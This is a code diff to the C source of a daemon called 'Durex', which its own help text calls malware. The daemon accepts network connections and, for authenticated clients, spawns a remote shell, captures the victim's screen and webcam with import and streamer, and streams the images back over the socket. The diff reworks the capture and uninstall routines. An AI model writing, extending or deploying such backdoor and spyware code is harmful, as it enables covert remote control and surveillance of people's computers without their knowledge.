@@ -36,19 +36,19 @@ bool	setup_deamon(t_connexion *connexion, uint16_t port)
 	return (true);
 }
 
-static char	*get_ip()
-{
-	int n;
-	struct ifreq ifr;
-	char array[] = "enp7s1";
+/*static char	*get_ip()*/
+/*{*/
+/*int n;*/
+/*struct ifreq ifr;*/
+/*char array[] = "enp7s1";*/
 
-	n = socket(AF_INET, SOCK_DGRAM, 0);
-	ifr.ifr_addr.sa_family = AF_INET;
-	strncpy(ifr.ifr_name , array , IFNAMSIZ - 1);
-	ioctl(n, SIOCGIFADDR, &ifr);
-	close(n);
-	return (inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr));
-}
+/*n = socket(AF_INET, SOCK_DGRAM, 0);*/
+/*ifr.ifr_addr.sa_family = AF_INET;*/
+/*strncpy(ifr.ifr_name , array , IFNAMSIZ - 1);*/
+/*ioctl(n, SIOCGIFADDR, &ifr);*/
+/*close(n);*/
+/*return (inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr));*/
+/*}*/
 
 void	create_daemon()
 {
@@ -125,7 +125,7 @@ static void	spawn_shell(t_users *users, char **envp)
 	}
 }
 
-static uint8_t	remove_daemon(t_users *users)
+static uint8_t	remove_daemon(t_users *users, char **envp)
 {
 	pid_t	pid = 0;
 	char	*exec[] = {"/usr/sbin/service", "Durex", "uninstall", NULL};
@@ -139,7 +139,7 @@ static uint8_t	remove_daemon(t_users *users)
 	else if (pid == 0)
 	{
 		send(users->sd, "\033[31mRemoved\033[0m\n> ", 17, 0);
-		if (execve(exec[0], exec, NULL) == -1)
+		if (execve(exec[0], exec, envp) == -1)
 			printf("error\n");
 	}
 	else
@@ -152,32 +152,37 @@ static uint8_t	remove_daemon(t_users *users)
 
 static void	screen(t_users *users, char **envp, uint8_t flag)
 {
+	#define IMG_PATH "/tmp/screen.jpeg"
 	pid_t	pid = 0;
 	// mplayer -vo png -frames 1 tv://
-	char	*exec_screen[] = {"/usr/bin/import", "-window", "root", "/tmp/screen.jpeg", NULL};
-	char	*exec_cam[] = {"/usr/bin/streamer", "-f", "jpeg", "-s", "1920x1080", "-o", "/tmp/cam.jpeg", NULL};
-	// streamer -f jpeg -s 1024x768 -o image.jpeg
+	char	*exec_screen[] = {"/usr/bin/import", "-window", "root", IMG_PATH, NULL};
+	/*char	*exec_screen[] = {"/usr/bin/scrot", "/tmp/screen.jpeg", NULL};*/
+	char	*exec_cam[] = {"/usr/bin/streamer", "-f", "jpeg", "-s", "1920x1080", "-o", IMG_PATH, NULL};
+	/*streamer -f jpeg -s 1024x768 -o image.jpeg*/
 	int		status;
 	ssize_t	ret_read = 0;
 	char	buff[BUFFSIZE] = {0};
 	int		fd = 0;
 
+	(void)envp;
 	pid = fork();
 	if (pid == -1)
-	{
 		perror("fork failed");
-	}
 	else if (pid == 0)
 	{
 		if (flag == SCREEN)
 		{
+			/*system("/usr/bin/import -window root /tmp/screen.jpeg");*/
+			/*dprintf(1, "%s %s %s %s\n", exec_screen[0], exec_screen[1], exec_screen[2], exec_screen[3]);*/
 			if (execve(exec_screen[0], exec_screen, envp) == -1)
-				printf("error\n");
+				perror("execv");
+				/*printf("error scrren\n");*/
 		}
 		else if (flag == CAM)
 		{
 			if (execve(exec_cam[0], exec_cam, envp) == -1)
-				printf("error\n");
+				perror("execv");
+				/*printf("error cam\n");*/
 		}
 	}
 	else
@@ -187,29 +192,36 @@ static void	screen(t_users *users, char **envp, uint8_t flag)
 	}
 
 	struct stat	st;
-	if (flag == SCREEN)
-		fd = open("/tmp/screen.jpeg", O_RDONLY);
-	else
-		fd = open("/tmp/cam.jpeg", O_RDONLY);
+	/*if (flag == SCREEN)*/
+	fd = open(IMG_PATH, O_RDONLY);
+	if (fd == -1)
+	{
+		send(users->sd, "Screen failed !", strlen("screen failed !"), 0);
+		return ;
+	}
+	/*else*/
+	/*fd = open("/tmp/cam.jpeg", O_RDONLY);*/
 	if (fd)
 	{
 		fstat(fd, &st);
 		char	size[7] = {0};
 		sprintf(size, "%lu", st.st_size);
+		printf("%lu", st.st_size);
 		send(users->sd, &size, strlen(size), 0);
 		while ((ret_read = read(fd, &buff, BUFFSIZE)) > 0)
 			send(users->sd, &buff, ret_read, 0);
 	}
-	if (flag == SCREEN)
-		remove("/tmp/screen.jpeg");
-	else
-		remove("/tmp/cam.jpeg");
+	/*if (flag == SCREEN)*/
+	remove(IMG_PATH);
+	/*else*/
+	/*remove("/tmp/cam.jpeg");*/
 
 }
 
 static void	signal_handler(int sig)
 {
 	puts("Ctrl-C by User");
+	(void)sig;
 }
 
 bool	run_daemon(t_connexion *connexion, char **envp)
@@ -221,8 +233,8 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 	memset(&users, 0, sizeof(users));
 
 	/*close(0);*/
-	close(1);
-	close(2);
+	/*close(1);*/
+	/*close(2);*/
 	signal(SIGPIPE, signal_handler);
 	if (listen(connexion->master_socket, 3) < 0)
 	{
@@ -302,11 +314,11 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 							users.nb_user--;
 						}
 						if (!strcmp(buffer, "remove") && users.key[users.i] == true)
-							remove_daemon(&users);
+							remove_daemon(&users, envp);
 						else if (!strcmp(buffer, "screen") && users.key[users.i] == true)
-						screen(&users, envp, SCREEN);
+							screen(&users, envp, SCREEN);
 						else if (!strcmp(buffer, "cam") && users.key[users.i] == true)
-						screen(&users, envp, CAM);
+							screen(&users, envp, CAM);
 						else if (!strcmp(buffer, "?") && users.key[users.i] == true)
 							send(users.sd, "\r'shell'\t\tSpawn remote shell\n'quit'\t\tClose program\n'remove'\tremove malware\n> ", 77, 0);
 						else if (!strcmp(buffer, "shell") && users.key[users.i] == true)
@@ -325,10 +337,10 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 			}
 			/*for (int j = 0; j <= 2; j++)*/
 			/*{*/
-				/*if (connexion->client_socket[j] != 0)*/
-					/*break;*/
-				/*[>else if (j == 2)<]*/
-				/*[>return (true);<]*/
+			/*if (connexion->client_socket[j] != 0)*/
+			/*break;*/
+			/*[>else if (j == 2)<]*/
+			/*[>return (true);<]*/
 			/*}*/
 		}
 	}
